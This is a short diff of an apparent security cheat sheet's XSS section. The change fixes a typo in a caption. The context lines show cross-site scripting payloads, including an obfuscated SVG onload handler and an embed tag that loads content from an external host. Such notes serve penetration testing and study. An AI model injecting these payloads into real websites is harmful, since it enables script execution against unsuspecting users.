@@ -37,7 +37,7 @@ Setup locales:
 
 ## Web Applications Security
 ### XSS
-Some helpful payload caught in the wild
+Some helpful payloads caught in the wild
 ```html
 <svG x=1 onload=(co\u006efirm)``//
 <embed src=//14.rs>
